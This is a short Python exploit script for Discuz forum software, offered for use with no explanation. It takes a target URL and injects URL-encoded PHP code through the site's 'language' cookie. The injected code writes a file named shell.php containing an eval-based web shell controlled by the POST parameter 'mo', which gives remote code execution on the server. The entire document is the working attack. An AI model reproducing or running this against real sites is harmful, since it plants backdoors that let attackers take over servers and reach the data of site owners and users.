# Junsec
import requests,argparse,re
from urllib import request
from http import cookiejar

def discuz_exp():
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",help="target url")
	args = parser.parse_args()
	url = args.url
	if url == None:
		print('Input target website!')

	else:	
		#url = "http://127.0.0.1/discuz/upload/index.php"
		shell = "%27.file_put_contents%28%27shell.php%27%2Curldecode%28%27%253c%253fphp%2520eval%28%2524_%2550%254F%2553%2554%255b%2522mo%2522%255d%29%253b%253f%253e%27%29%29.%27"
		cookie = cookiejar.CookieJar()
		handler = request.HTTPCookieProcessor(cookie)
		opener = request.build_opener(handler)
		response = opener.open(url)
		cookies = ''
		for item in cookie:
			if re.findall('language',item.name):
				cookies = cookies + item.name + '=' + item.value + shell +';'
			else:
				cookies = cookies + item.name + '=' + item.value + ';'
		
		headers = {'User-Agent':"Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25",
					"cookie":cookies
		}
		res = requests.get(url,headers=headers)

discuz_exp()